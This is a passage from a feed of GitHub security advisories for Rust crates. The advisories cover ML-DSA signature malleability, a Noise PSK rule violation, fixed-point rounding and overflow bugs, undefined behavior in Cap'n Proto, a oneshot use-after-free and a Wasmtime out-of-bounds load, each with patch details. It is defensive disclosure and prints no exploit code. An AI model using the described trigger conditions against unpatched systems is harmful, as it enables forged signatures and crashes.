<li><strong>Bug introduced</strong> (commit <code>b01c3b7</code> - "Make ML-DSA signature decoding follow the spec (#895)"): Changed to <code>&lt;=</code></li>
</ul>
<p>The commit message suggests it was intended to fix issue #894 and make decoding follow the spec, but the change to the <code>monotonic</code> function was in the wrong direction. The other changes in that commit (to <code>use_hint</code> function) may have been correct, but this specific change introduced signature malleability.</p>
<h3 id="technical-impact">Technical Impact</h3>
<p>This vulnerability allows <strong>signature malleability</strong> - the same logical signature can have multiple valid byte-level encodings. An attacker can take a valid signature and create additional "valid" signatures by duplicating hint indices.</p>
<p>Per the ML-DSA specification (FIPS 204, Section 6.2 and Algorithm 26 <code>HintBitUnpack</code>), hint indices must be strictly increasing to ensure a unique, canonical encoding. Accepting non-canonical signatures can lead to:</p>
<ol>
<li><strong>Signature Malleability:</strong> Multiple distinct byte sequences verify as valid for the same message/key pair</li>
<li><strong>Protocol-Level Vulnerabilities:</strong> Systems that rely on signature uniqueness (e.g., for transaction deduplication, replay protection, or signature-based identifiers) may be vulnerable</li>
<li><strong>Interoperability Issues:</strong> Non-compliant signatures may be rejected by other conforming implementations</li>
</ol>
<h3 id="affected-security-levels">Affected Security Levels</h3>
<p>All ML-DSA parameter sets are affected:</p>
<ul>
<li>ML-DSA-44 (NIST Security Level 2)</li>
<li>ML-DSA-65 (NIST Security Level 3)</li>
<li>ML-DSA-87 (NIST Security Level 5)</li>
</ul>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>See the file <a href="https://gist.github.com/orenyomtov/fb4616eb77d33017f41a71b30aa41a04"><code>poc_mldsa_repeated_hint.rs</code></a> for a standalone proof of concept that demonstrates the vulnerability.</p>
<p>The PoC uses test vectors from the Wycheproof test suite that specifically test for this invalid encoding:</p>
<ul>
<li><strong>Test Vector Source:</strong> <a href="https://github.com/C2SP/wycheproof/blob/master/testvectors_v1/mldsa_44_verify_test.json">Wycheproof ML-DSA Test Vectors</a></li>
<li>Test Case ID 18: "signature with a repeated hint"</li>
<li>Expected Result: <code>invalid</code></li>
<li>Actual Result: <code>valid</code> (BUG)</li>
</ul>
<h2 id="remediation">Remediation</h2>
<p>Update the <code>monotonic</code> function in <code>ml-dsa/src/hint.rs</code> to use strict less-than comparison:</p>
<pre><code class="language-rust">fn monotonic(a: &amp;[usize]) -&gt; bool {
    a.iter().enumerate().all(|(i, x)| i == 0 || a[i - 1] &lt; *x)
}
</code></pre>
<h2 id="design-intent-ml-dsa-is-not-intended-to-allow-malleability">Design Intent: ML-DSA is NOT Intended to Allow Malleability</h2>
<p>While some cryptographic libraries intentionally permit signature malleability for compatibility or performance reasons, <strong>ML-DSA is explicitly designed to prevent it</strong>:</p>
<ol>
<li><p><strong>FIPS 204 Specification:</strong> ML-DSA is designed to be strongly unforgeable under chosen message attacks (SUF-CMA). This security property explicitly prevents signature malleability.</p>
</li>
<li><p><strong>NIST PQC Forum Discussion:</strong> In February 2024, there was a discussion on the NIST PQC forum about potential malleability in ML-DSA's hint unpacking. The consensus was that ML-DSA is intended to be SUF-CMA, meaning any malleability issues should be considered bugs and fixed.</p>
</li>
<li><p><strong>No Documentation of Intentional Malleability:</strong> There is no documentation in the RustCrypto <code>ml-dsa</code> crate, FIPS 204, or RFC 9881 suggesting that signature malleability is an acceptable or intentional property.</p>
</li>
<li><p><strong>Regression Bug:</strong> The fact that the original implementation had strict ordering (<code>&lt;</code>) and this was changed to non-strict (<code>&lt;=</code>) in a "fix" commit suggests this was an unintentional regression, not a design decision.</p>
</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/RustCrypto/signatures/security/advisories/GHSA-5x2r-hc65-25f9">https://github.com/RustCrypto/signatures/security/advisories/GHSA-5x2r-hc65-25f9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-24850">https://nvd.nist.gov/vuln/detail/CVE-2026-24850</a></li>
<li><a href="https://github.com/RustCrypto/signatures/issues/894">https://github.com/RustCrypto/signatures/issues/894</a></li>
<li><a href="https://github.com/RustCrypto/signatures/pull/895">https://github.com/RustCrypto/signatures/pull/895</a></li>
<li><a href="https://github.com/RustCrypto/signatures/commit/400961412be2e2ab787942cf30e0a9b66b37a54a">https://github.com/RustCrypto/signatures/commit/400961412be2e2ab787942cf30e0a9b66b37a54a</a></li>
<li><a href="https://github.com/RustCrypto/signatures/commit/b01c3b73dd08d0094e089aa234f78b6089ec1f38">https://github.com/RustCrypto/signatures/commit/b01c3b73dd08d0094e089aa234f78b6089ec1f38</a></li>
<li><a href="https://csrc.nist.gov/pubs/fips/204/final">https://csrc.nist.gov/pubs/fips/204/final</a></li>
<li><a href="https://datatracker.ietf.org/doc/html/rfc9881">https://datatracker.ietf.org/doc/html/rfc9881</a></li>
<li><a href="https://github.com/C2SP/wycheproof">https://github.com/C2SP/wycheproof</a></li>
<li><a href="https://github.com/C2SP/wycheproof/blob/master/testvectors_v1/mldsa_44_verify_test.json">https://github.com/C2SP/wycheproof/blob/master/testvectors_v1/mldsa_44_verify_test.json</a></li>
<li><a href="https://github.com/C2SP/wycheproof/blob/master/testvectors_v1/mldsa_65_verify_test.json">https://github.com/C2SP/wycheproof/blob/master/testvectors_v1/mldsa_65_verify_test.json</a></li>
<li><a href="https://github.com/C2SP/wycheproof/blob/master/testvectors_v1/mldsa_87_verify_test.json">https://github.com/C2SP/wycheproof/blob/master/testvectors_v1/mldsa_87_verify_test.json</a></li>
<li><a href="https://github.com/advisories/GHSA-5x2r-hc65-25f9">https://github.com/advisories/GHSA-5x2r-hc65-25f9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5x2r-hc65-25f9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-01-28T16:44:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[clatter] Clatter has a PSK Validity Rule Violation issue]]></title>
        <id>https://github.com/advisories/GHSA-253q-9q78-63x4</id>
        <link href="https://github.com/advisories/GHSA-253q-9q78-63x4"/>
        <updated>2026-01-28T16:21:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Protocol compliance vulnerability. The library allowed post-quantum handshake patterns that violated the PSK validity rule (Noise Protocol Framework Section 9.3). This could allow PSK-derived keys to be used for encryption without proper randomization by self-chosen ephemeral randomness, weakening security guarantees and potentially allowing catastrophic key reuse.</p>
<p>Affected default patterns include <code>noise_pqkk_psk0</code>, <code>noise_pqkn_psk0</code>, <code>noise_pqnk_psk0</code>, <code>noise_pqnn_psk0</code>, and some hybrid variants. Users of these patterns may have been using handshakes that do not meet the intended security properties.</p>
<h3 id="patches">Patches</h3>
<p>The issue is fully patched and released in Clatter v2.2.0. The fixed version includes runtime checks to detect offending handshake patterns.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Avoid using offending <code>*_psk0</code> variants of post-quantum patterns. Review custom handshake patterns carefully.</p>
<h3 id="resources">Resources</h3>
<ul>
<li><a href="https://noiseprotocol.org/noise.html#validity-rule">PSK validity rule</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jmlepisto/clatter/security/advisories/GHSA-253q-9q78-63x4">https://github.com/jmlepisto/clatter/security/advisories/GHSA-253q-9q78-63x4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-24785">https://nvd.nist.gov/vuln/detail/CVE-2026-24785</a></li>
<li><a href="https://github.com/jmlepisto/clatter/commit/b65ae6e9b8019bed5407771e21f89ddff17c5a71">https://github.com/jmlepisto/clatter/commit/b65ae6e9b8019bed5407771e21f89ddff17c5a71</a></li>
<li><a href="https://noiseprotocol.org/noise.html#validity-rule">https://noiseprotocol.org/noise.html#validity-rule</a></li>
<li><a href="https://github.com/advisories/GHSA-253q-9q78-63x4">https://github.com/advisories/GHSA-253q-9q78-63x4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-253q-9q78-63x4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-01-28T16:21:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[soroban-fixed-point-math] soroban-fixed-point-math has Incorrect Rounding and Overflow Handling in Signed Fixed-Point Math with Negatives]]></title>
        <id>https://github.com/advisories/GHSA-x5m4-43jf-hh65</id>
        <link href="https://github.com/advisories/GHSA-x5m4-43jf-hh65"/>
        <updated>2026-01-28T16:18:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<h4 id="incorrect-rounding-direction-for-signed-mul-and-div-operations">Incorrect rounding direction for signed mul and div operations</h4>
<p>The <code>mulDiv(x, y, z)</code> function incorrectly handled cases where both the intermediate product $x * y$ and the divisor $z$ were negative. The logic assumed that if the intermediate product was negative, the final result must also be negative, neglecting the sign of $z$.</p>
<p>This resulted in rounding being applied in the wrong direction for cases where both $x * y$ and $z$ were negative. The functions most at risk are <code>fixed_div_floor</code> and <code>fixed_div_ceil</code>, as they often use non-constant numbers as the divisor $z$ in <code>mulDiv</code>. </p>
<p>This error is present in all signed <code>FixedPoint</code> and <code>SorobanFixedPoint</code> implementations, including <code>i64</code>, <code>i128</code>, and <code>I256</code>.</p>
<h4 id="negative-overflow-in-i64">Negative Overflow in <code>i64</code></h4>
<p>The <code>mulDiv(x, y, z)</code> function for <code>i64</code> used the <code>i128</code> type to handle "phantom overflows". These are overflows that occur intermediately during a calculation, like when computing the intermediate product $x * y$. When the final result of <code>mulDiv</code> was computed in <code>i128</code>, it was scaled back down to <code>i64</code> before returning. While the code verified that the result did not exceed <code>i64::MAX</code>, it did not check against <code>i64::MIN</code>.</p>
<p>This caused negative results smaller than <code>i64:MIN</code> to wrap around to a large positive number instead of being caught as an overflow.</p>
<p>This error only exists for the <code>FixedPoint</code> implementation of <code>i64</code>. </p>
<h3 id="patches">Patches</h3>
<ul>
<li>v1.3.0 users should upgrade to patch v1.3.1</li>
<li>v1.4.0 users should upgrade to patch v1.4.1</li>
</ul>
<p>All versions <code>&gt;=v1.4.1</code> contain the patch. </p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no known workarounds. Upgrade to the patched version.</p>
<h3 id="credits">Credits</h3>
<p>soroban-fixed-point-math would like to thank the team at <a href="https://www.certora.com/">Certora</a> for discovering and reporting the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/script3/soroban-fixed-point-math/security/advisories/GHSA-x5m4-43jf-hh65">https://github.com/script3/soroban-fixed-point-math/security/advisories/GHSA-x5m4-43jf-hh65</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-24783">https://nvd.nist.gov/vuln/detail/CVE-2026-24783</a></li>
<li><a href="https://github.com/script3/soroban-fixed-point-math/commit/c9233f7094198a49ed66a4d75786a8a3755c936a">https://github.com/script3/soroban-fixed-point-math/commit/c9233f7094198a49ed66a4d75786a8a3755c936a</a></li>
<li><a href="https://github.com/script3/soroban-fixed-point-math/releases/tag/v1.3.1">https://github.com/script3/soroban-fixed-point-math/releases/tag/v1.3.1</a></li>
<li><a href="https://github.com/script3/soroban-fixed-point-math/releases/tag/v1.4.1">https://github.com/script3/soroban-fixed-point-math/releases/tag/v1.4.1</a></li>
<li><a href="https://github.com/advisories/GHSA-x5m4-43jf-hh65">https://github.com/advisories/GHSA-x5m4-43jf-hh65</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x5m4-43jf-hh65</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-01-28T16:18:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[soroban-fixed-point-math] soroban-fixed-point-math has Incorrect Rounding and Overflow Handling in Signed Fixed-Point Math with Negatives]]></title>
        <id>https://github.com/advisories/GHSA-x5m4-43jf-hh65</id>
        <link href="https://github.com/advisories/GHSA-x5m4-43jf-hh65"/>
        <updated>2026-01-28T16:18:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<h4 id="incorrect-rounding-direction-for-signed-mul-and-div-operations">Incorrect rounding direction for signed mul and div operations</h4>
<p>The <code>mulDiv(x, y, z)</code> function incorrectly handled cases where both the intermediate product $x * y$ and the divisor $z$ were negative. The logic assumed that if the intermediate product was negative, the final result must also be negative, neglecting the sign of $z$.</p>
<p>This resulted in rounding being applied in the wrong direction for cases where both $x * y$ and $z$ were negative. The functions most at risk are <code>fixed_div_floor</code> and <code>fixed_div_ceil</code>, as they often use non-constant numbers as the divisor $z$ in <code>mulDiv</code>. </p>
<p>This error is present in all signed <code>FixedPoint</code> and <code>SorobanFixedPoint</code> implementations, including <code>i64</code>, <code>i128</code>, and <code>I256</code>.</p>
<h4 id="negative-overflow-in-i64">Negative Overflow in <code>i64</code></h4>
<p>The <code>mulDiv(x, y, z)</code> function for <code>i64</code> used the <code>i128</code> type to handle "phantom overflows". These are overflows that occur intermediately during a calculation, like when computing the intermediate product $x * y$. When the final result of <code>mulDiv</code> was computed in <code>i128</code>, it was scaled back down to <code>i64</code> before returning. While the code verified that the result did not exceed <code>i64::MAX</code>, it did not check against <code>i64::MIN</code>.</p>
<p>This caused negative results smaller than <code>i64:MIN</code> to wrap around to a large positive number instead of being caught as an overflow.</p>
<p>This error only exists for the <code>FixedPoint</code> implementation of <code>i64</code>. </p>
<h3 id="patches">Patches</h3>
<ul>
<li>v1.3.0 users should upgrade to patch v1.3.1</li>
<li>v1.4.0 users should upgrade to patch v1.4.1</li>
</ul>
<p>All versions <code>&gt;=v1.4.1</code> contain the patch. </p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no known workarounds. Upgrade to the patched version.</p>
<h3 id="credits">Credits</h3>
<p>soroban-fixed-point-math would like to thank the team at <a href="https://www.certora.com/">Certora</a> for discovering and reporting the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/script3/soroban-fixed-point-math/security/advisories/GHSA-x5m4-43jf-hh65">https://github.com/script3/soroban-fixed-point-math/security/advisories/GHSA-x5m4-43jf-hh65</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-24783">https://nvd.nist.gov/vuln/detail/CVE-2026-24783</a></li>
<li><a href="https://github.com/script3/soroban-fixed-point-math/commit/c9233f7094198a49ed66a4d75786a8a3755c936a">https://github.com/script3/soroban-fixed-point-math/commit/c9233f7094198a49ed66a4d75786a8a3755c936a</a></li>
<li><a href="https://github.com/script3/soroban-fixed-point-math/releases/tag/v1.3.1">https://github.com/script3/soroban-fixed-point-math/releases/tag/v1.3.1</a></li>
<li><a href="https://github.com/script3/soroban-fixed-point-math/releases/tag/v1.4.1">https://github.com/script3/soroban-fixed-point-math/releases/tag/v1.4.1</a></li>
<li><a href="https://github.com/advisories/GHSA-x5m4-43jf-hh65">https://github.com/advisories/GHSA-x5m4-43jf-hh65</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x5m4-43jf-hh65</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-01-28T16:18:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[capnp] Cap'n Proto has Undefined Behavior in constant::Reader and StructSchema]]></title>
        <id>https://github.com/advisories/GHSA-5w5r-mf82-595p</id>
        <link href="https://github.com/advisories/GHSA-5w5r-mf82-595p"/>
        <updated>2026-01-28T16:06:09.000Z</updated>
        <content type="html"><![CDATA[<p>The safe API functions <code>constant::Reader::get</code> and <code>StructSchema::new</code> rely on <code>PointerReader::get_root_unchecked</code>, which can cause undefined behavior (UB) by constructing arbitrary words or schemas.</p>
<h2 id="readerget"><code>Reader::get</code></h2>
<pre><code class="language-rust">pub fn get(&amp;self) -&gt; Result&lt;&lt;T as Owned&gt;::Reader&lt;'static&gt;&gt; {
    // ...
    // UNSAFE: access `words` without validation
}
</code></pre>
<h2 id="structschemanew"><code>StructSchema::new</code></h2>
<pre><code class="language-rust">pub fn new(builder: RawBrandedStructSchema) -&gt; StructSchema {
    // ...
    // UNSAFE: access encoded nodes without validation
}
</code></pre>
<p>This vulnerability allows safe Rust code to trigger UB, which violates Rust's safety guarantees.</p>
<p>The issue is resolved in version <code>0.24.0</code> by making constructor functions unsafe and mark the fields of struct as visible only in the crate.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/capnproto/capnproto-rust/issues/605">https://github.com/capnproto/capnproto-rust/issues/605</a></li>
<li><a href="https://github.com/capnproto/capnproto-rust/commit/7b981f4c75a975c80444cd38729bcdf12bf3eabf">https://github.com/capnproto/capnproto-rust/commit/7b981f4c75a975c80444cd38729bcdf12bf3eabf</a></li>
<li><a href="https://github.com/capnproto/capnproto-rust/commit/e3aeec213e6d1b30a182bf61682a370f20d8a02c">https://github.com/capnproto/capnproto-rust/commit/e3aeec213e6d1b30a182bf61682a370f20d8a02c</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2025-0143.html">https://rustsec.org/advisories/RUSTSEC-2025-0143.html</a></li>
<li><a href="https://github.com/advisories/GHSA-5w5r-mf82-595p">https://github.com/advisories/GHSA-5w5r-mf82-595p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5w5r-mf82-595p</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-01-28T16:06:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gix-date] Duplicate Advisory: gix-date can create non-utf8 string with `TimeBuf::as_str`]]></title>
        <id>https://github.com/advisories/GHSA-8rgq-m2pm-jvmg</id>
        <link href="https://github.com/advisories/GHSA-8rgq-m2pm-jvmg"/>
        <updated>2026-01-27T22:22:40.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-6mw6-mj76-grwc. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>A flaw was found in gix-date. The <code>gix_date::parse::TimeBuf::as_str</code> function can generate strings containing invalid non-UTF8 characters. This issue violates the internal safety invariants of the <code>TimeBuf</code> component, leading to undefined behavior when these malformed strings are subsequently processed. This could potentially result in application instability or other unforeseen consequences.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-0810">https://nvd.nist.gov/vuln/detail/CVE-2026-0810</a></li>
<li><a href="https://github.com/GitoxideLabs/gitoxide/issues/2305">https://github.com/GitoxideLabs/gitoxide/issues/2305</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2026-0810">https://access.redhat.com/security/cve/CVE-2026-0810</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2427057">https://bugzilla.redhat.com/show_bug.cgi?id=2427057</a></li>
<li><a href="https://crates.io/crates/gix-date">https://crates.io/crates/gix-date</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2025-0140.html">https://rustsec.org/advisories/RUSTSEC-2025-0140.html</a></li>
<li><a href="https://github.com/advisories/GHSA-8rgq-m2pm-jvmg">https://github.com/advisories/GHSA-8rgq-m2pm-jvmg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8rgq-m2pm-jvmg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-01-26T21:30:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[oneshot] oneshot has potential Use After Free when used asynchronously]]></title>
        <id>https://github.com/advisories/GHSA-rvr2-r3pv-5m4p</id>
        <link href="https://github.com/advisories/GHSA-rvr2-r3pv-5m4p"/>
        <updated>2026-01-27T00:59:08.000Z</updated>
        <content type="html"><![CDATA[<p>There is a race condition that can lead to a use-after-free if a <code>oneshot::Receiver</code> is polled but then dropped instead of polled to completion. This could happen if the receiver future was cancelled while receiving, for example by being wrapped in a timeout future or similar.</p>
<p>When the <code>Receiver</code> is polled (<code>Future::poll</code>) it writes a waker to the channel and sets it to the <code>RECEIVING</code> state. If the <code>Receiver</code> was then dropped (instead of polled to completion), the <code>Drop</code> implementation on <code>Receiver</code> unconditionally swapped the channel state to <code>DISCONNECTED</code> and only after doing so it read back its waker from the heap allocation and dropped it. The problem is that the <code>DISCONNECTED</code> state could be observed by the <code>Sender</code>, which would lead to it deallocating the channel heap memory. If the <code>Sender</code> manage to free the channel before the <code>Receiver</code> managed to proceed to dropping the waker, then the <code>Receiver</code> would read from the freed channel memory (Use After Free).</p>
<p>The fix was submitted in <a href="https://github.com/faern/oneshot/pull/74">https://github.com/faern/oneshot/pull/74</a> and published as part of <code>oneshot</code> version <code>0.1.12</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/faern/oneshot/issues/73">https://github.com/faern/oneshot/issues/73</a></li>
<li><a href="https://github.com/rustsec/advisory-db/pull/2600">https://github.com/rustsec/advisory-db/pull/2600</a></li>
<li><a href="https://github.com/faern/oneshot/commit/d1a1506010bc48962634807d0dcca682af4f50ba">https://github.com/faern/oneshot/commit/d1a1506010bc48962634807d0dcca682af4f50ba</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0005.html">https://rustsec.org/advisories/RUSTSEC-2026-0005.html</a></li>
<li><a href="https://github.com/advisories/GHSA-rvr2-r3pv-5m4p">https://github.com/advisories/GHSA-rvr2-r3pv-5m4p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rvr2-r3pv-5m4p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-01-27T00:59:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[wasmtime] Wasmtime segfault or unused out-of-sandbox load with f64.copysign operator on x86-64]]></title>
        <id>https://github.com/advisories/GHSA-vc8c-j3xm-xj73</id>
        <link href="https://github.com/advisories/GHSA-vc8c-j3xm-xj73"/>
        <updated>2026-01-29T03:28:36.000Z</updated>
        <content type="html"><![CDATA[<p>On x86-64 platforms with AVX Wasmtime's compilation of the <code>f64.copysign</code> WebAssembly instruction with Cranelift may load 8 more bytes than is necessary. When <a href="https://docs.rs/wasmtime/latest/wasmtime/struct.Config.html#method.signals_based_traps">signals-based-traps</a> are disabled this can result in a uncaught segfault due to loading from unmapped guard pages. With guard pages disabled it's possible for out-of-sandbox data to be loaded, but unless there is another bug in Cranelift this data is not visible to WebAssembly guests.</p>
<h3 id="details">Details</h3>
<p>The <code>f64.copysign</code> operator, when operating on a value loaded from a memory (for example with <code>f64.load</code>), compiles with Cranelift to code on x86-64 with AVX that loads 128 bits (16 bytes) rather than the expected 64 bits (8 bytes) from memory. When the address is in-bounds for a (correct) 8-byte load but not an (incorrect) 16-byte load, this can load beyond memory by up to 8 bytes. This can result in three different behaviors depending on Wasmtime's configuration:</p>
<ol>
<li>If guard pages are disabled then this extra data will be loaded. The extra data is present in the upper bits of a register, but the upper bits are not visible to WebAssembly guests. Actually witnessing this data would require a different bug in Cranelift, of which none are known. Thus in this situation while it's something we're patching in Cranelift it's not a security issue.</li>
<li>If guard pages are enabled, and <a href="https://docs.rs/wasmtime/latest/wasmtime/struct.Config.html#method.signals_based_traps">signals-based-traps</a> are enabled, then this operation will result in a safe WebAssembly trap. The trap is incorrect because the load is not out-of-bounds as defined by WebAssembly, but this mistakenly widened load will load bytes from an unmapped guard page, causing a segfault which is caught and handled as a Wasm trap. In this situation this is not a security issue, but we're patching Cranelift to fix the WebAssembly behavior.</li>
<li>If guard pages are enabled, and <a href="https://docs.rs/wasmtime/latest/wasmtime/struct.Config.html#method.signals_based_traps">signals-based-traps</a> are disabled, then this operation results in an uncaught segfault. Like the previous case with guard pages enabled this will load from an unmapped guard page. Unlike before, however, signals-based-traps are disabled meaning that signal handlers aren't configured. The resulting segfault will, by default, terminate the process. This is a security issue from a DoS perspective, but does not represent an arbitrary read or write from WebAssembly, for example.</li>
</ol>
<p>Wasmtime's default configuration is case (2) in this case. That means that Wasmtime, by default, incorrectly executes this WebAssembly instruction but does not have insecure behavior.</p>
<h3 id="impact">Impact</h3>
<p>If <a href="https://docs.rs/wasmtime/latest/wasmtime/struct.Config.html#method.signals_based_traps">signals-based-traps</a> are disabled and guard pages are enabled then guests can trigger an uncaught segfault in the host, likely aborting the host process. This represents, for example, a DoS vector for WebAssembly guests.</p>
<p>This bug does not affect Wasmtime's default configuration and requires <a href="https://docs.rs/wasmtime/latest/wasmtime/struct.Config.html#method.signals_based_traps">signals-based-traps</a> to be disabled. This bug only affects the x86-64 target with the AVX feature enabled and the Cranelift backend (Wasmtime's default backend).</p>
<h3 id="patches">Patches</h3>
<p>Wasmtime 36.0.5, 40.0.3, and 41.0.1 have been released to fix this issue. Users are recommended to upgrade to the patched versions of Wasmtime. Other affected versions <a href="https://docs.wasmtime.dev/stability-release.html">are not patched</a> and users should updated to supported major version instead.</p>
<h3 id="workarounds">Workarounds</h3>
<p>This bug can be worked around by enabling <a href="https://docs.rs/wasmtime/latest/wasmtime/struct.Config.html#method.signals_based_traps">signals-based-traps</a>. While disabling guard pages can be a quick fix in some situations, it's not recommended to disabled guard pages as it is a key defense-in-depth measure of Wasmtime.</p>
<h3 id="resources">Resources</h3>
<ul>
<li><a href="https://docs.rs/wasmtime/latest/wasmtime/struct.Config.html#method.signals_based_traps">signals-based-traps configuration</a></li>
<li><a href="https://docs.rs/wasmtime/latest/wasmtime/struct.Config.html#method.memory_guard_size">guard pages configuration</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-vc8c-j3xm-xj73">https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-vc8c-j3xm-xj73</a></li>
<li><a href="https://github.com/bytecodealliance/wasmtime/commit/728fa07184f8da2a046f48ef9b61f869dce133a6">https://github.com/bytecodealliance/wasmtime/commit/728fa07184f8da2a046f48ef9b61f869dce133a6</a></li>
<li><a href="https://github.com/bytecodealliance/wasmtime/commit/799585fc362fcb991de147dd1a9f2ba0861ed440">https://github.com/bytecodealliance/wasmtime/commit/799585fc362fcb991de147dd1a9f2ba0861ed440</a></li>
<li><a href="https://github.com/bytecodealliance/wasmtime/commit/ac92d9bb729ad3a6d93f0724c4c33a0c4a9c0227">https://github.com/bytecodealliance/wasmtime/commit/ac92d9bb729ad3a6d93f0724c4c33a0c4a9c0227</a></li>
<li><a href="https://docs.rs/wasmtime/latest/wasmtime/struct.Config.html#method.memory_guard_size">https://docs.rs/wasmtime/latest/wasmtime/struct.Config.html#method.memory_guard_size</a></li>
<li><a href="https://docs.rs/wasmtime/latest/wasmtime/struct.Config.html#method.signals_based_traps">https://docs.rs/wasmtime/latest/wasmtime/struct.Config.html#method.signals_based_traps</a></li>
<li><a href="https://docs.wasmtime.dev/stability-release.html">https://docs.wasmtime.dev/stability-release.html</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-24116">https://nvd.nist.gov/vuln/detail/CVE-2026-24116</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0006.html">https://rustsec.org/advisories/RUSTSEC-2026-0006.html</a></li>
<li><a href="https://github.com/advisories/GHSA-vc8c-j3xm-xj73">https://github.com/advisories/GHSA-vc8c-j3xm-xj73</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vc8c-j3xm-xj73</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-01-27T00:48:20.000Z</published>
    </entry>
</feed>